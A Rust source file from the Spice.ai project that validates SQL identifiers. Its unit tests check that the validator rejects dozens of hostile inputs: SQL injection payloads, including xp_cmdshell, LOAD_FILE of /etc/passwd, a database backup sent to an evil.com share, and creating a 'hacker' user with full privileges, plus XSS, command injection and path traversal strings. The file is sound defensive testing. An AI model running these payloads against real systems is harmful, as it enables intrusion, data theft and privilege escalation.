/*
Copyright 2024-2025 The Spice.ai OSS Authors

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

     https://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

use datafusion::sql::sqlparser::{
    dialect::{Dialect, GenericDialect},
    tokenizer::{Token, Tokenizer},
};
use snafu::prelude::*;

#[derive(Debug, Snafu)]
pub enum Error {
    #[snafu(display("Component name is not a valid identifier"))]
    InvalidIdentifier,
}

pub mod catalog;
pub mod dataset;
pub mod view;

/// Validates an identifier to ensure it represents a valid component name.
///
/// Uses the sqlparser-rs library to ensure it represents only a valid SQL identifier.
///
/// Only allow SQL words and periods, and ensure that periods are not consecutive.
///
/// Allowed:
/// - `valid_identifier`
/// - `test.one.two`
/// - `"test".foo.bar`
///
/// Disallowed:
/// - `sneaky\"; CREATE TABLE foo (id int); -- putting comments!`
/// - `validate your inputs!`
pub fn validate_identifier(identifier: &str) -> Result<(), Error> {
    let dialect: Box<dyn Dialect> = Box::new(GenericDialect);
    let mut tokenizer = Tokenizer::new(dialect.as_ref(), identifier);
    let Ok(tokens) = tokenizer.tokenize() else {
        return Err(Error::InvalidIdentifier);
    };

    if tokens.is_empty() {
        return Err(Error::InvalidIdentifier);
    }

    let mut expect_period = false;
    for token in tokens {
        if expect_period && matches!(token, Token::Period) {
            expect_period = false;
            continue;
        } else if expect_period {
            return Err(Error::InvalidIdentifier);
        }

        let Token::Word(word) = token else {
            return Err(Error::InvalidIdentifier);
        };

        if word.value.is_empty() {
            return Err(Error::InvalidIdentifier);
        }

        expect_period = true;
    }

    // Ensure the last token is not a period
    if !expect_period {
        return Err(Error::InvalidIdentifier);
    }

    Ok(())
}

/// Helper function that finds the position and length of the first delimiter ('://', ':', or '/')
fn find_first_delimiter(from: &str) -> Option<(usize, usize)> {
    // Find the earliest occurrence of each delimiter
    let colon_slash_slash = from.find("://");
    let colon = from.find(':');
    let slash = from.find('/');

    // Get the position and length of the first delimiter
    match (colon_slash_slash, colon, slash) {
        (Some(css), Some(c), Some(s)) => {
            let min_pos = css.min(c).min(s);
            Some(if min_pos == css {
                (css, 3)
            } else {
                (min_pos, 1)
            })
        }
        (Some(css), Some(c), None) => Some(if css < c { (css, 3) } else { (c, 1) }),
        (Some(css), None, Some(s)) => Some(if css < s { (css, 3) } else { (s, 1) }),
        (None, Some(c), Some(s)) => Some(if c < s { (c, 1) } else { (s, 1) }),
        (Some(css), None, None) => Some((css, 3)),
        (None, Some(c), None) => Some((c, 1)),
        (None, None, Some(s)) => Some((s, 1)),
        (None, None, None) => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_identifier() {
        // Valid identifiers
        assert!(validate_identifier("valid_identifier").is_ok());
        assert!(validate_identifier("test.one.two").is_ok());
        assert!(validate_identifier("\"test\".foo.bar").is_ok());
        assert!(validate_identifier("a1").is_ok());
        assert!(validate_identifier("_underscore").is_ok());
        assert!(validate_identifier("camelCase").is_ok());
        assert!(validate_identifier("PascalCase").is_ok());
        assert!(validate_identifier("snake_case_123").is_ok());
        assert!(validate_identifier("\"quoted.identifier\"").is_ok());
        assert!(validate_identifier("db.schema.table").is_ok());
        assert!(validate_identifier("schema.table").is_ok());
        assert!(validate_identifier("valid@identifier").is_ok());

        // Invalid identifiers
        assert!(
            validate_identifier("sneaky\"; CREATE TABLE foo (id int); -- putting comments!")
                .is_err()
        );
        assert!(validate_identifier("validate your inputs!").is_err());
        assert!(validate_identifier("").is_err());
        assert!(validate_identifier(" ").is_err());
        assert!(validate_identifier("1invalid").is_err());
        assert!(validate_identifier("invalid-identifier").is_err());
        assert!(validate_identifier("invalid:identifier").is_err());
        assert!(validate_identifier("invalid/identifier").is_err());
        assert!(validate_identifier("invalid\\identifier").is_err());
        assert!(validate_identifier("invalid.").is_err());
        assert!(validate_identifier(".invalid").is_err());
        assert!(validate_identifier("invalid..identifier").is_err());
        assert!(validate_identifier("\"unclosed.quote").is_err());
        assert!(validate_identifier("closed.\"quote\"unclosed.\"quote").is_err());

        // SQL injection attack attempts
        assert!(validate_identifier("users; DROP TABLE users;").is_err());
        assert!(validate_identifier("admin'--").is_err());
        assert!(validate_identifier("user' OR '1'='1").is_err());
        assert!(validate_identifier("user\"; SELECT * FROM secrets; --").is_err());
        assert!(validate_identifier("user'); DELETE FROM users; --").is_err());
        assert!(validate_identifier("user\\\"; TRUNCATE TABLE logs; --").is_err());
        assert!(
            validate_identifier("user/**/UNION/**/SELECT/**/password/**/FROM/**/users").is_err()
        );
        assert!(validate_identifier(
            "user' UNION SELECT NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES; --"
        )
        .is_err());
        assert!(validate_identifier("user' AND 1=CONVERT(int,(SELECT @@version)); --").is_err());
        assert!(validate_identifier("user' AND 1=1 WAITFOR DELAY '0:0:10'--").is_err());
        assert!(validate_identifier("user'); EXEC xp_cmdshell('net user'); --").is_err());
        assert!(validate_identifier(
            "user' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
        )
        .is_err());
        assert!(validate_identifier("user' ORDER BY 1--").is_err());
        assert!(validate_identifier("user' GROUP BY 1--").is_err());
        assert!(validate_identifier("user' HAVING 1=1--").is_err());
        assert!(validate_identifier(
            "user'; INSERT INTO users (username, password) VALUES ('hacker', 'password');--"
        )
        .is_err());
        assert!(validate_identifier(
            "user'; UPDATE users SET admin = true WHERE username = 'hacker';--"
        )
        .is_err());
        assert!(validate_identifier(
            "user'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255);--"
        )
        .is_err());
        assert!(validate_identifier("user'; CREATE TRIGGER malicious_trigger AFTER INSERT ON users BEGIN /* malicious code */;--").is_err());
        assert!(validate_identifier("user'; LOAD_FILE('/etc/passwd');--").is_err());
        assert!(validate_identifier("user'; SELECT @@datadir;--").is_err());
        assert!(validate_identifier("user' UNION SELECT NULL,NULL,SLEEP(5)--").is_err());
        assert!(validate_identifier("user' AND (SELECT COUNT(*) FROM users) > 0--").is_err());
        assert!(validate_identifier(
            "user' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'--"
        )
        .is_err());
        assert!(validate_identifier("user'; DECLARE @cmd VARCHAR(255); SET @cmd = 'dir c:'; EXEC master..xp_cmdshell @cmd;--").is_err());
        assert!(validate_identifier(
            "user'; BACKUP DATABASE master TO DISK = '\\\\evil.com\\share\\backup.bak';--"
        )
        .is_err());
        assert!(validate_identifier("user' UNION ALL SELECT table_name, column_name, NULL FROM information_schema.columns--").is_err());
        assert!(
            validate_identifier("user'; CREATE USER hacker IDENTIFIED BY 'password';--").is_err()
        );
        assert!(
            validate_identifier("user'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';--").is_err()
        );

        // XSS-like attempts
        assert!(validate_identifier("<script>alert('XSS')</script>").is_err());
        assert!(validate_identifier("javascript:alert('XSS')").is_err());
        assert!(validate_identifier(
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
        )
        .is_err());

        // Command injection attempts
        assert!(validate_identifier("user; cat /etc/passwd").is_err());
        assert!(validate_identifier("user && whoami").is_err());
        assert!(validate_identifier("user | netstat -an").is_err());
        assert!(validate_identifier("user` echo vulnerable`").is_err());

        // Null byte injection
        assert!(validate_identifier("user\0malicious").is_err());

        // Path traversal attempts
        assert!(validate_identifier("../../../etc/passwd").is_err());
        assert!(validate_identifier("..\\..\\..\\Windows\\System32").is_err());
    }
}
